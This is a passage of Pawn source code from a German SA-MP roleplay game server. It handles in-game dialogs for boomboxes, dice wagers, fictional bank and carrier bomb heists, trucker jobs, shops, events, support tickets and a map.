				        ShowPlayerDialog(playerid,DIALOG_BOOM2,DIALOG_STYLE_LIST,"Musikbox","iLove Radio\n1Live\nBig FM","Anwenden","");
				        new Float:xx,Float:yy,Float:zz;
				        GetPlayerPos(playerid,xx,yy,zz);
				        BoomBox[1][0] = xx;
				        BoomBox[1][1] = yy;
				        BoomBox[1][2] = zz;
				        CallLocalFunction("cmd_bomb","d",playerid);
				        Musikobject[1] = CreateDynamicObjectEx(2226,xx,yy,zz-1,0,0,0,50,50);
						for(new x = 0; x < sizeof(SpielerInventar[]); x++)
						{
					    	if(SpielerInventar[playerid][x][0] == 30)
					    	{
								new mm2 = x;
								SpielerInventar[playerid][mm2][0] = -1;
				    			SpielerInventar[playerid][mm2][1] = 0;
				       			PlayerTextDrawHide(playerid,SpielerInventarText[playerid][x+7]);
								PlayerTextDrawSetString(playerid,SpielerInventarText[playerid][x+22],"0");
							}
						}
					}else{SendClientMessage(playerid,COLOR_RED,"Hier steht bereits eine Boombox!");}
			    }
				else if(Musikbox[2] == -1)
			    {
	      			if(!IsPlayerInRangeOfPoint(playerid,40,BoomBox[0][0],BoomBox[0][1],BoomBox[0][2]) && !IsPlayerInRangeOfPoint(playerid,40,BoomBox[1][0],BoomBox[1][1],BoomBox[1][2]))
			        {
				        Musikbox[2] = playerid;
				        ShowPlayerDialog(playerid,DIALOG_BOOM2,DIALOG_STYLE_LIST,"Musikbox","iLove Radio\n1Live\nBig FM","Anwenden","");
				        new Float:xx,Float:yy,Float:zz;
				        GetPlayerPos(playerid,xx,yy,zz);
				        BoomBox[2][0] = xx;
				        BoomBox[2][1] = yy;
				        BoomBox[2][2] = zz;
				        CallLocalFunction("cmd_bomb","d",playerid);
				        Musikobject[2] = CreateDynamicObjectEx(2226,xx,yy,zz-1,0,0,0,50,50);
						for(new x = 0; x < sizeof(SpielerInventar[]); x++)
						{
					    	if(SpielerInventar[playerid][x][0] == 30)
					    	{
								new mm2 = x;
								SpielerInventar[playerid][mm2][0] = -1;
				    			SpielerInventar[playerid][mm2][1] = 0;
				       			PlayerTextDrawHide(playerid,SpielerInventarText[playerid][x+7]);
								PlayerTextDrawSetString(playerid,SpielerInventarText[playerid][x+22],"0");
							}
						}
	                }else{SendClientMessage(playerid,COLOR_RED,"Hier steht bereits eine Boombox!");}
			    }else{SendClientMessage(playerid,COLOR_RED,"Es gibt bereits 3 Musikboxen auf dem Server!");}
			}else{SendClientMessage(playerid,COLOR_RED,"Du hast bereits eine Musikbox erstellt!");}
		}
		if(listitem == 1)
		{
            ShowPlayerDialog(playerid,DIALOG_BOOM3,DIALOG_STYLE_LIST,"Musikbox","iLove Radio\n1Live\nBig FM","Anwenden","");
		}
		if(listitem == 2)
		{
		    if(Musikbox[0] == playerid)
		    {
		        Musikbox[0] = -1;
		        BoomBox[0][0] = 0;
		        BoomBox[0][1] = 0;
		        BoomBox[0][2] = 0;
		        Musikboxm[0] = 0;
				DestroyDynamicObject(Musikobject[0]);
				Verstauen(playerid,2226,1);
		    }
			else if(Musikbox[1] == playerid)
		    {
		        Musikbox[1] = -1;
		        BoomBox[1][0] = 0;
		        BoomBox[1][1] = 0;
		        BoomBox[1][2] = 0;
				Musikboxm[1] = 0;
				DestroyDynamicObject(Musikobject[1]);
				Verstauen(playerid,2226,1);
		    }
			else if(Musikbox[2] == playerid)
		    {
		        Musikbox[2] = -1;
		        BoomBox[2][0] = 0;
		        BoomBox[2][1] = 0;
		        BoomBox[2][2] = 0;
		        Musikboxm[2] = 0;
				DestroyDynamicObject(Musikobject[2]);
				Verstauen(playerid,2226,1);
		    }else{SendClientMessage(playerid,COLOR_RED,"Du hast keine Musikbox erstellt!");}
		}
	}
	else if(dialogid == DIALOG_BOOM3)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
		        if(Musikbox[0] == playerid)
		        {
		            for(new i = 0; i < MAX_PLAYERS; i++)
		            {
		                if(IsPlayerInRangeOfPoint(i,30,BoomBox[0][0],BoomBox[0][1],BoomBox[0][2]))
		                {
		                    StopAudioStreamForPlayer(i);
		                    Musikboxm[0] = 1;
	         				Musikboxdrinne[i] = 0;
						}
					}
		        }
		        else if(Musikbox[1] == playerid)
		        {
		            for(new i = 0; i < MAX_PLAYERS; i++)
		            {
		                if(IsPlayerInRangeOfPoint(i,30,BoomBox[1][0],BoomBox[1][1],BoomBox[1][2]))
		                {
		                    StopAudioStreamForPlayer(i);Musikboxm[1] = 1;
	         				Musikboxdrinne[i] = 0;
						}
					}
		        }
		        else if(Musikbox[2] == playerid)
		        {
		            for(new i = 0; i < MAX_PLAYERS; i++)
		            {
		                if(IsPlayerInRangeOfPoint(i,30,BoomBox[2][0],BoomBox[2][1],BoomBox[2][2]))
		                {
		                    StopAudioStreamForPlayer(i);Musikboxm[2] = 1;
	         				Musikboxdrinne[i] = 0;
						}
					}
		        }
			}
			if(listitem == 1)
	        {
		        if(Musikbox[0] == playerid)
		        {
		            for(new i = 0; i < MAX_PLAYERS; i++)
		            {
		                if(IsPlayerInRangeOfPoint(i,30,BoomBox[0][0],BoomBox[0][1],BoomBox[0][2]))
		                {
		                    StopAudioStreamForPlayer(i);Musikboxm[0] = 2;
	         				Musikboxdrinne[i] = 0;
						}
					}
		        }
		        else if(Musikbox[1] == playerid)
		        {
		            for(new i = 0; i < MAX_PLAYERS; i++)
		            {
		                if(IsPlayerInRangeOfPoint(i,30,BoomBox[1][0],BoomBox[1][1],BoomBox[1][2]))
		                {
		                    StopAudioStreamForPlayer(i);Musikboxm[1] = 2;
	         				Musikboxdrinne[i] = 0;
						}
					}
		        }
		        else if(Musikbox[2] == playerid)
		        {
		            for(new i = 0; i < MAX_PLAYERS; i++)
		            {
		                if(IsPlayerInRangeOfPoint(i,30,BoomBox[2][0],BoomBox[2][1],BoomBox[2][2]))
		                {
		                    StopAudioStreamForPlayer(i);Musikboxm[2] = 2;
	         				Musikboxdrinne[i] = 0;
						}
					}
		        }
			}
			if(listitem == 2)
	        {
		        if(Musikbox[0] == playerid)
		        {
		            for(new i = 0; i < MAX_PLAYERS; i++)
		            {
		                if(IsPlayerInRangeOfPoint(i,30,BoomBox[0][0],BoomBox[0][1],BoomBox[0][2]))
		                {
		                    StopAudioStreamForPlayer(i);Musikboxm[0] = 3;
	         				Musikboxdrinne[i] = 0;
						}
					}
		        }
		        else if(Musikbox[1] == playerid)
		        {
		            for(new i = 0; i < MAX_PLAYERS; i++)
		            {
		                if(IsPlayerInRangeOfPoint(i,30,BoomBox[1][0],BoomBox[1][1],BoomBox[1][2]))
		                {
		                    StopAudioStreamForPlayer(i);Musikboxm[1] = 3;
	         				Musikboxdrinne[i] = 0;
						}
					}
		        }
		        else if(Musikbox[2] == playerid)
		        {
		            for(new i = 0; i < MAX_PLAYERS; i++)
		            {
		                if(IsPlayerInRangeOfPoint(i,30,BoomBox[2][0],BoomBox[2][1],BoomBox[2][2]))
		                {
		                    StopAudioStreamForPlayer(i);Musikboxm[2] = 3;
	         				Musikboxdrinne[i] = 0;
						}
					}
		        }
			}
	    }
	}
	else if(dialogid == DIALOG_BOOM2)
	{
	    if(listitem == 0)
		{
   			if(Musikbox[0] == playerid)
		    {
				Musikboxm[0] = 1;
		    }
			else if(Musikbox[1] == playerid)
		    {
				Musikboxm[1] = 1;
		    }
			else if(Musikbox[2] == playerid)
		    {
				Musikboxm[2] = 1;
		    }
		}
		if(listitem == 1)
		{
            if(Musikbox[0] == playerid)
		    {
				Musikboxm[0] = 2;
		    }
			else if(Musikbox[1] == playerid)
		    {
				Musikboxm[1] = 2;
		    }
			else if(Musikbox[2] == playerid)
		    {
				Musikboxm[2] = 2;
		    }
		}
		if(listitem == 2)
		{
            if(Musikbox[0] == playerid)
		    {
				Musikboxm[0] = 3;
		    }
			else if(Musikbox[1] == playerid)
		    {
				Musikboxm[1] = 3;
		    }
			else if(Musikbox[2] == playerid)
		    {
				Musikboxm[2] = 3;
		    }
		}
	}
	else if(dialogid == DIALOG_WUERFEL)
	{
	    if(response)
	    {
	        if(IsPlayerConnected(spielerw1) && IsPlayerConnected(spielerw2))
	        {
		        SendFormatMessage(spielerw1,COLOR_ORANGE,"%s hat das Angebot angenommen.",PlayerName(spielerw2));
		        SendFormatMessage(spielerw2,COLOR_ORANGE,"Du hast das Angebot von %s angenommen.",PlayerName(spielerw1));
		        GebeGeld(spielerw1,-wuerfelgeld);
		        GebeGeld(spielerw2,-wuerfelgeld);
		        wuerfelgeld += wuerfelgeld;
	  			format(string, sizeof(string), "Es geht um %.2f%", wuerfelgeld);
				SendRadiusMessage(spielerw1,20.0,string,COLOR_ORANGE);
		        format(string, sizeof(string), "%s würfelt....", PlayerName(spielerw2));
				SendRadiusMessage(spielerw2,20.0,string,COLOR_PURPLE);
				format(string, sizeof(string), "%s würfelt....", PlayerName(spielerw1));
				SendRadiusMessage(spielerw1,20.0,string,COLOR_PURPLE);
				SetTimer("Timerwu",500,0);
			}
			else
			{
			    SendClientMessage(playerid,COLOR_RED,"Einer von euch beiden ist nicht Online!");
     			kannwuerfel = 0;
				wuerfelgeld = 0.0;
			    spielerw1 = -1;
			    spielerw2 = -1;
			}

	    }
	    else{
	        SendClientMessage(playerid,COLOR_RED,"Du hast das Angebot abgelehnt!");
	        SendClientMessage(spielerw1,COLOR_RED,"Der andere Spieler hat das Angebot abgelehnt!");
    		kannwuerfel = 0;
			wuerfelgeld = 0.0;
		    spielerw1 = -1;
		    spielerw2 = -1;
	    }
	}
	else if(dialogid == DIALOG_BOMBSETZ)
	{
	    print("Dialogaufruf DIALOG_BOMBSETZ");
		if(response)
		{
			for(new x = 0; x < sizeof(SpielerInventar[]); x++)
			{
			    if(SpielerInventar[playerid][x][0] == 29)
			    {
			        SpielerInventar[playerid][x][1]--;
           			if(SpielerInventar[playerid][x][1] == 0)
	                {
	                    SpielerInventar[playerid][x][0] = -1;
			        	PlayerTextDrawHide(playerid,SpielerInventarText[playerid][x+7]);
						PlayerTextDrawSetString(playerid,SpielerInventarText[playerid][x+22],"0");
	                }
			    }
			}
			if(Bombenplatz[playerid] == 1)
			{
	   			format(string,sizeof string,"HQ: %s sprengt die Banktür in Santa Felton!",PlayerName(playerid));
				FraktionsNachricht(1,COLOR_HQ,string);
				FraktionsNachricht(2,COLOR_HQ,string);
				FraktionsNachricht(15,COLOR_HQ,string);
				SendClientMessage(playerid,COLOR_GREEN,"Bombe erfolgreich platziert! Die Bombe zündet in 60 Sekunden! Verschwinde aus der Bank!");
				SetTimer("explodesf",1000*60,0);
				SetTimer("Banktor",1000*60*90,0);
				for(new i = 0; i < MAX_PLAYERS; i++)
				{
					PlayAudioStreamForPlayer(i, "https://county-islands.com/sounds/BankBomb.mp3",6418.9063,-7756.9092,4.3636,120.0, 1);
				}
			}
			else if(Bombenplatz[playerid] == 2)
			{
				format(string,sizeof string,"HQ: %s sprengt die Banktür in Lake Sorten!",PlayerName(playerid));
				FraktionsNachricht(1,COLOR_HQ,string);
				FraktionsNachricht(2,COLOR_HQ,string);
				FraktionsNachricht(15,COLOR_HQ,string);
				SendClientMessage(playerid,COLOR_GREEN,"Bombe erfolgreich platziert! Die Bombe zündet in 60 Sekunden! Verschwinde aus der Bank!");
				banktuerexplodee = 60;
				bankdarf = 0;
				SetTimer("Banktor2",1000*60*90,0);
   				for(new i = 0; i < MAX_PLAYERS; i++)
				{
					PlayAudioStreamForPlayer(i, "https://county-islands.com/sounds/BankBomb.mp3",1589.6729,-8551.6230,2.3310,120, 1);
				}
			}
			else if(Bombenplatz[playerid] == 3)
			{
			    if(treagerstop == 1) return SendClientMessage(playerid,COLOR_RED,"Die Tür kann noch nicht gesprengt werden!");
			    treagerstop = 1;
			    new cops = 0, army = 0;
			    for(new i = 0; i < MAX_PLAYERS; i++)
				{
				    if(IsPlayerConnected(i) && !IsPlayerNPC(i) && SpielerInfo[i][uDienst] == 1 && (IstSpielerInFrak(i,1) || IstSpielerInFrak(i,2)))
				    {
				        cops++;
				        if(cops == 2) break;
				    }
				}
				for(new i = 0; i < MAX_PLAYERS; i++)
				{
				    if(IsPlayerConnected(i) && !IsPlayerNPC(i) && SpielerInfo[i][uDienst] == 1 && (IstSpielerInFrak(i,15)))
				    {
				        army++;
				        if(army == 2) break;
				    }
				}
				if(cops == 2 && army == 2)
				{
					format(string,sizeof string,"HQ: %s sprengt die Tür des Flugzeugträgers!",PlayerName(playerid));
					FraktionsNachricht(1,COLOR_HQ,string);
					FraktionsNachricht(2,COLOR_HQ,string);
					FraktionsNachricht(15,COLOR_HQ,string);
					SendClientMessage(playerid,COLOR_GREEN,"Bombe erfolgreich platziert! Die Bombe zündet in 20 Sekunden! Verschwinde von der Tür!");
					tuersetzen1 = 1;
					tuertimer1 = 180;
					SetTimer("Tragerneurauben",1000*60*60*4,0);
					SetTimer("Bombeexplodetur1",1000*20,0);
	   				for(new i = 0; i < MAX_PLAYERS; i++)
					{
						PlayAudioStreamForPlayer(i, "https://county-islands.com/sounds/BankBomb.mp3",1427.43787, -7537.79297, 19.24610,120, 1);
					}
				}else SendClientMessage(playerid,COLOR_RED,"Es müssen mindestens zwei Polizisten und zwei von der Army Online sein!");
			}
			else if(Bombenplatz[playerid] == 4)
			{
			    if(treagerstop == 1) return SendClientMessage(playerid,COLOR_RED,"Die Tür kann noch nicht gesprengt werden!");
			    treagerstop = 1;
			    new cops = 0, army = 0;
			    for(new i = 0; i < MAX_PLAYERS; i++)
				{
				    if(IsPlayerConnected(i) && !IsPlayerNPC(i) && SpielerInfo[i][uDienst] == 1 && (IstSpielerInFrak(i,1) || IstSpielerInFrak(i,2)))
				    {
				        cops++;
				        if(cops == 2) break;
				    }
				}
				for(new i = 0; i < MAX_PLAYERS; i++)
				{
				    if(IsPlayerConnected(i) && !IsPlayerNPC(i) && SpielerInfo[i][uDienst] == 1 && (IstSpielerInFrak(i,15)))
				    {
				        army++;
				        if(army == 2) break;
				    }
				}
				if(cops == 2 && army == 2)
				{
					format(string,sizeof string,"HQ: %s sprengt die Tür des Flugzeugträgers!",PlayerName(playerid));
					FraktionsNachricht(1,COLOR_HQ,string);
					FraktionsNachricht(2,COLOR_HQ,string);
					FraktionsNachricht(15,COLOR_HQ,string);
					SendClientMessage(playerid,COLOR_GREEN,"Bombe erfolgreich platziert! Die Bombe zündet in 20 Sekunden! Verschwinde von der Tür!");
					tuersetzen2 = 1;
					tuertimer2 = 180;
					SetTimer("Tragerneurauben",1000*60*60*4,0);
					SetTimer("Bombeexplodetur2",1000*20,0);
	   				for(new i = 0; i < MAX_PLAYERS; i++)
					{
						PlayAudioStreamForPlayer(i, "https://county-islands.com/sounds/BankBomb.mp3",1428.59412, -7541.41357, 12.19320,120, 1);
					}
				}
				else SendClientMessage(playerid,COLOR_RED,"Es müssen mindestens zwei Polizisten und zwei von der Army Online sein!");
			}
			else if(Bombenplatz[playerid] == 5)
			{
				if(treagerstop == 1) return SendClientMessage(playerid,COLOR_RED,"Die Tür kann noch nicht gesprengt werden!");
			    treagerstop = 1;
			    new cops = 0, army = 0;
			    for(new i = 0; i < MAX_PLAYERS; i++)
				{
				    if(IsPlayerConnected(i) && !IsPlayerNPC(i) && SpielerInfo[i][uDienst] == 1 && (IstSpielerInFrak(i,1) || IstSpielerInFrak(i,2)))
				    {
				        cops++;
				        if(cops == 2) break;
				    }
				}
				for(new i = 0; i < MAX_PLAYERS; i++)
				{
				    if(IsPlayerConnected(i) && !IsPlayerNPC(i) && SpielerInfo[i][uDienst] == 1 && (IstSpielerInFrak(i,15)))
				    {
				        army++;
				        if(army == 2) break;
				    }
				}
				if(cops == 2 && army == 2)
				{
					format(string,sizeof string,"HQ: %s sprengt die Tür des Flugzeugträgers!",PlayerName(playerid));
					FraktionsNachricht(1,COLOR_HQ,string);
					FraktionsNachricht(2,COLOR_HQ,string);
					FraktionsNachricht(15,COLOR_HQ,string);
					SendClientMessage(playerid,COLOR_GREEN,"Bombe erfolgreich platziert! Die Bombe zündet in 20 Sekunden! Verschwinde von der Tür!");
					tuersetzen3 = 1;
					tuertimer3 = 180;
					SetTimer("Tragerneurauben",1000*60*60*4,0);
					SetTimer("Bombeexplodetur3",1000*20,0);
	   				for(new i = 0; i < MAX_PLAYERS; i++)
					{
						PlayAudioStreamForPlayer(i, "https://county-islands.com/sounds/BankBomb.mp3",1429.62158, -7577.70264, 4.17059,120, 1);
					}
				}else SendClientMessage(playerid,COLOR_RED,"Es müssen mindestens zwei Polizisten und zwei von der Army Online sein!");
			}
			else if(Bombenplatz[playerid] == 6)
			{
				if(tresordarf == 0) return SendClientMessage(playerid,COLOR_RED,"Es wurde keine Tür gesprengt!");
				format(string,sizeof string,"HQ: %s sprengt den Tresor für den Zünder!",PlayerName(playerid));
				FraktionsNachricht(1,COLOR_HQ,string);
				FraktionsNachricht(2,COLOR_HQ,string);
				FraktionsNachricht(15,COLOR_HQ,string);
				SendClientMessage(playerid,COLOR_GREEN,"Bombe erfolgreich platziert! Die Bombe zündet in 15 Sekunden! Verschwinde vom Tresor!");
				tuersetzen4 = 1;
				tuertimer4 = 180;
				tresordarf = 0;
				SetTimerEx("tresortur",1000*15,0,"%i",playerid);
   				for(new i = 0; i < MAX_PLAYERS; i++)
				{
					PlayAudioStreamForPlayer(i, "https://county-islands.com/sounds/BankBomb.mp3",1436.43591, -7563.22510, 11.88010,120, 1);
				}
			}
		}
		else
		{
			SendClientMessage(playerid,COLOR_RED,"Dann halt nicht..");
		}
	}

	else if(dialogid == DIALOG_FISCHE)
	{
	    if(response)
	    {
	        CallLocalFunction("cmd_inventar","d",playerid);
	    }
	}
	else if(dialogid == DIALOG_PIZZA)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
   		    	SelectTextDraw(playerid, -8257281);
		    	for(new x = 0; x < sizeof(EssenPizza); x++)TextDrawShowForPlayer(playerid,EssenPizza[x]);
	        }
        	if(listitem == 1)
	        {
	            if(PlayerTruckmodus[playerid] == 4)
	            {
	                SendClientMessage(playerid,COLOR_GREEN,"Danke für die Lieferung! Hier sind die 120$");
	                GebeGeld(playerid,120);
	                PlayerTruckmodus[playerid] = 5;
    				ClearAnimations(playerid);
				    SetPlayerSpecialAction(playerid,SPECIAL_ACTION_NONE);
				    RemovePlayerAttachedObject(playerid, 9);
	            }else SendClientMessage(playerid,COLOR_RED,"Du kannst hier zurzeit keine Produkte abliefern!");
	        }
	    }
	}
	else if(dialogid == DIALOG_BURGER)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
   		    	SelectTextDraw(playerid, -8257281);
		    	for(new x = 0; x < sizeof(EssensMenu); x++)TextDrawShowForPlayer(playerid,EssensMenu[x]);
	        }
        	if(listitem == 1)
	        {
	            if(PlayerTruckmodus[playerid] == 6)
	            {
	                SendClientMessage(playerid,COLOR_GREEN,"Danke für die Lieferung! Hier sind die 210$");
	                GebeGeld(playerid,210);
	                PlayerTruckmodus[playerid] = 7;
    				ClearAnimations(playerid);
				    SetPlayerSpecialAction(playerid,SPECIAL_ACTION_NONE);
				    RemovePlayerAttachedObject(playerid, 9);
	            }else SendClientMessage(playerid,COLOR_RED,"Du kannst hier zurzeit keine Produkte abliefern!");
	        }
	    }
	}



	else if(dialogid == DIALOG_TRUCKER1)
	{
	    if(response)
	    {
	        switch(listitem)
	        {
		        case 0:
		        {
					new veh = GetPlayerVehicleID(playerid);
		            //prod
		            new drinne = 0;
		            for(new x = 0; x < sizeof(Trucker); x++)
					{
					    if(veh == Trucker[x])
					    {
					        if(GetVehicleModel(veh) == 499 && GetPlayerState(playerid) == PLAYER_STATE_DRIVER || GetVehicleModel(veh) == 498 && GetPlayerState(playerid) == PLAYER_STATE_DRIVER || GetVehicleModel(veh) == 414 && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
					        {
					        	drinne++;
					        	ShowPlayerDialog(playerid,DIALOG_TRUCKER2,DIALOG_STYLE_MSGBOX,"Truckermenü","Job erklärung:\n\n1. Starte deinen Motor mit der Taste 'N' oder mit dem Befehl /motor\n2. Du fährst nach Lake Vortex und ladest 100 Produkte in dein Fahrzeug\n3. Du fährst 4 Checkpoints ab und musst Produkte ausliefern\n4. Sobald du alle 4 Checkpoints abgefahren hast, musst du zurück zum Truckerdepot fahren und bekommst noch Zuschüsse\n\nViel Spaß beim fahren!","Los","Abbrechen");
								break;
							}
						}
					}
					if(drinne == 0)
					{
						SendClientMessage(playerid,COLOR_RED,"Falsches Fahrzeug für Produktlieferant!");
					}
		        }
		        case 1:
		        {
					new veh = GetPlayerVehicleID(playerid);
		            //prod
		            new drinne = 0;
		            for(new x = 0; x < sizeof(Trucker); x++)
					{
					    if(veh == Trucker[x])
					    {
					        if(GetVehicleModel(veh) == 514 && GetPlayerState(playerid) == PLAYER_STATE_DRIVER || GetVehicleModel(veh) == 403 && GetPlayerState(playerid) == PLAYER_STATE_DRIVER || GetVehicleModel(veh) == 515 && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
					        {
					            drinne++;
					            if(IsTrailerAttachedToVehicle(veh))
					            {
						        	ShowPlayerDialog(playerid,DIALOG_TRUCKERS1,DIALOG_STYLE_MSGBOX,"Truckermenü","Job erklärung:\n\n1. Starte deinen Motor mit der Taste 'N' oder mit dem Befehl /motor\n2. Danach fährst du in das Industriegebiet und pumpst Öl ab.\n3. Danach gibst du das abgepumpte Öl ab.\n4.Als nächstes holst du das verarbeitete Öl ab und fährst vor zum Ölwart.\n5. Der Ölwart gibt dir ein Zeichen und du darfst das Öl an eine beliebige Tankstelle ausliefern.\n\nViel Spaß wünscht dir County Islands ","Los","");
									break;
								}
								else
								{
								    SendClientMessage(playerid,COLOR_RED,"Du hast keinen Anhänger angehängt!");
								}
							}
						}
					}
					if(drinne == 0)
					{
						SendClientMessage(playerid,COLOR_RED,"Falsches Fahrzeug für Tanklieferant!");
					}
		        }
   			}
	        
	    }
	    else
	    {
	        RemovePlayerFromVehicle(playerid);
	    }
	}
	else if(dialogid == DIALOG_TRUCKERS1)
	{
	    SendClientMessage(playerid,COLOR_GREEN,"Begib dich ins Industriegebiet! (Checkpoint)");
	    PlayerTrucker[playerid] = 2;
	    SetPlayerCheckpoint(playerid,2980.3362,-8759.5928,4.3858-1,5);
		TruckSpritmodus[playerid] = 1;
		playervehiclemerk[playerid] = GetPlayerVehicleID(playerid);
	}
	else if(dialogid == DIALOG_TRUCKER2)
	{
	    if(response)
	    {
	        SendClientMessage(playerid,COLOR_GREEN,"Begib dich zum ersten Checkpoint!");
			PlayerTrucker[playerid] = 1;
			PlayerTruckmodus[playerid] = 1;
			playervehiclemerk[playerid] = GetPlayerVehicleID(playerid);
			vehicleprodukte[GetPlayerVehicleID(playerid)] = 0;
			PlayerProdukt[playerid] = 0;
			if(truckercp == 0)
			{
			    truckercp = 1;
			    SetPlayerCheckpoint(playerid,3352.5720,-8591.7637,4.3878-1,5);
			}
			else if(truckercp == 1)
			{
			    truckercp = 0;
			    SetPlayerCheckpoint(playerid,3353.8796,-8602.0898,4.3878-1,5);
			}
	    }
	    else
	    {
	        RemovePlayerFromVehicle(playerid);
	    }
	}

	else if(dialogid == DIALOG_EVENT)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
	        	CallLocalFunction("cmd_eventerstellen","d",playerid);
	        }
	        if(listitem == 1)
	        {
	            CallLocalFunction("cmd_eventstop","d",playerid);
	        }
	    }
	}
	else if(dialogid == DIALOG_SUPANN)
	{
	    if(response)
	    {
			new pimmelid = strval(inputtext);
			if(pimmelid < 0)return SendClientMessage(playerid,COLOR_RED,"Es gibt keine SpielerID unter 0!");
			if(Ticketplayer[pimmelid] == 1)
			{
				if(Ticketmerk[playerid] == -1)
				{
				    if(Ticketmerk[pimmelid] == -1)
				    {
					    new str[150];
					    format(str,sizeof(str),"%s hat dein Ticket angenommen. Schreibe mit /fl[TEXT]",PlayerName(playerid));
					    SendClientMessage(pimmelid,0xFF6400FF,str);
					    format(str,sizeof(str),"Du hast das Ticket von %s angenommen. Schreibe mit /fl[TEXT]",PlayerName(pimmelid));
					    SendClientMessage(playerid,0xFF6400FF,str);
					    format(str,sizeof(str),"%s hat das Ticket von %s angenommen.",PlayerName(playerid),PlayerName(pimmelid));
					    SendAdminMessage(COLOR_LIGHTRED,str,1);

				    	Ticketmerk[pimmelid] = playerid;
					    Ticketmerk[playerid] = pimmelid;
					    Ticketplayer[pimmelid] = 0;
					    SendClientMessage(pimmelid,0xFF6400FF,"Beende den Support mit /ende");
					    SendClientMessage(playerid,0xFF6400FF,"Beende den Support mit /ende");
					}else{SendClientMessage(playerid,COLOR_RED,"Der Spieler ist bereits in einem Support!");}
				}
				else{SendClientMessage(playerid,COLOR_RED,"Du bist bereits in einem Support!");}
			}else{SendClientMessage(playerid,COLOR_RED,"Der Spieler hat kein Ticket offen!");}
		}
	}
	if(dialogid == DIALOG_EVENTCREATE)
	{
	    if(response)
	    {
			switch(listitem)
			{
				case 0:
				{
					if(SpielerInfo[playerid][uGeld] <= 199 && event_state > 0)return SendClientMessage(playerid,-1,"Du hast nicht genügend Geld.");//Hier geld Abfrage rein machen von euch
					create_event(playerid,200.0,1);
					GebeGeld(playerid,-200);
					BizInfo[6][bkasse] += 200.1; Geschaftspeichern(6);
				}
			}
		}
	}
	if(dialogid == DIALOG_EVENTJOIN)
	{
		if(response==1)
		{
		    if(SpielerInfo[playerid][uGeld] > 99)
		    {
				event_join_player(playerid);
				GebeGeld(playerid,-100);
				BizInfo[6][bkasse] += 100.1;
				Geschaftspeichern(6);
			}else SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!");
		}
	}
	else if(dialogid == DIALOG_CIMAP)
	{
		if(response == 1)
		{
			if(listitem == 0)
			{
				switch(ci_map_selected[playerid])
				{
					case 1:{SetPlayerCheckpoint(playerid,1714.6095,-7695.9507,4.3940,10.0); cpaktiv[playerid] = 1;}//Villbeach cpaktiv[playerid] = 0;
					case 2:{SetPlayerCheckpoint(playerid,4335.8633,-7634.3604,4.3835,10.0);cpaktiv[playerid] = 1;}//Portland
					case 3:{SetPlayerCheckpoint(playerid,1690.4164,-9312.0137,4.4124,10.0);cpaktiv[playerid] = 1;}//Lake Sorten
					case 4:{SetPlayerCheckpoint(playerid,4224.2539,-8551.9141,4.2112,10.0);cpaktiv[playerid] = 1;}//Wrong Hill
					case 5:{SetPlayerCheckpoint(playerid,6469.6763,-7836.4307,4.2186,10.0);cpaktiv[playerid] = 1;}//Santa Felton
					case 6:{SetPlayerCheckpoint(playerid,6382.3721,-9300.6826,4.2166,10.0);cpaktiv[playerid] = 1;}//Lake Vortex
				}
				SendClientMessage(playerid,0xE4DE8CFF,"[County Islands Map]: Der Zielort wurde markiert.");
			}
			if(listitem == 1)
			{
				switch(ci_map_selected[playerid])
				{
					case 1:{ShowPlayerDialog(playerid, DIALOG_CIMAPINFO, DIALOG_STYLE_MSGBOX, "County Islands | Villbeach","Villbeach hat folgende Atraktionen:\n____________________________________\nDies ist das Villen Virtel von County Islands.", "Ok", "");}//Villbeach
					case 2:{ShowPlayerDialog(playerid, DIALOG_CIMAPINFO, DIALOG_STYLE_MSGBOX, "County Islands | Portland","Portland hat folgende Atraktionen:\n____________________________________\nFraktions Base: Grove Street\nFraktions Base: Atzecas", "Ok", "");}//Portland
					case 3:{ShowPlayerDialog(playerid, DIALOG_CIMAPINFO, DIALOG_STYLE_MSGBOX, "County Islands | Lake Sorten","Lake Sorten hat folgende Atraktionen:\n____________________________________\nFraktions Base: LSPD, LSMD, LSFD, Towing Service, Ballas\nLS Motel\nAutohaus\nLS Bank\nLS BSN\nParkhaus\nSkin Shop", "Ok", "");}//Lake Sorten
					case 4:{ShowPlayerDialog(playerid, DIALOG_CIMAPINFO, DIALOG_STYLE_MSGBOX, "County Islands | Wrong Hill","Wrong Hill hat folgende Atraktionen:\n____________________________________\nDies ist die Bergregion von County Islands.", "Ok", "");}//Wrong Hill
					case 5:{ShowPlayerDialog(playerid, DIALOG_CIMAPINFO, DIALOG_STYLE_MSGBOX, "County Islands | Santa Felton","Santa Felton hat folgende Atraktionen:\n____________________________________\nSF Motel\nSF Bank\nFraktions Autohaus\nFraktions Base: LVPD", "Ok", "");}//Santa Felton
					case 6:{ShowPlayerDialog(playerid, DIALOG_CIMAPINFO, DIALOG_STYLE_MSGBOX, "County Islands | Lake Vortex","Lake Vortex hat folgende Atraktionen:\n____________________________________\nFraktions Base: LVFD\nFraktions Base: LCN", "Ok", "");}//Lake Vortex
				}
			}
			if(listitem == 2)
			{
				new str[84],Float:dis;
				switch(ci_map_selected[playerid])
				{
					case 1:{dis=GetPlayerDistanceFromPoint(playerid, 1714.6095,-7695.9507,4.3940);}//Villbeach
					case 2:{dis=GetPlayerDistanceFromPoint(playerid, 4335.8633,-7634.3604,4.3835);}//Portland
					case 3:{dis=GetPlayerDistanceFromPoint(playerid, 1690.4164,-9312.0137,4.4124);}//Lake Sorten
					case 4:{dis=GetPlayerDistanceFromPoint(playerid, 4224.2539,-8551.9141,4.2112);}//Wrong Hill
					case 5:{dis=GetPlayerDistanceFromPoint(playerid, 6469.6763,-7836.4307,4.2186);}//Santa Felton
					case 6:{dis=GetPlayerDistanceFromPoint(playerid, 6382.3721,-9300.6826,4.2166);}//Lake Vortex
				}
				format(str,sizeof(str),"[County Islands Map]: Dieser Ort ist noch: '%0.0f' Meter von dir entfernt.",dis);
				SendClientMessage(playerid,0xE4DE8CFF,str);
			}
		}
	}
	else if(dialogid == DIALOG_FLAGER)
	{
	    if(response)
		{
			if(listitem == 0)
			{
			    ShowPlayerDialog(playerid,DIALOG_FLAGER2,DIALOG_STYLE_LIST,"Waffenlager","Mats Status\nWaffe herausnehmen","Weiter","Zurück");
			}
			if(listitem == 1)
			{
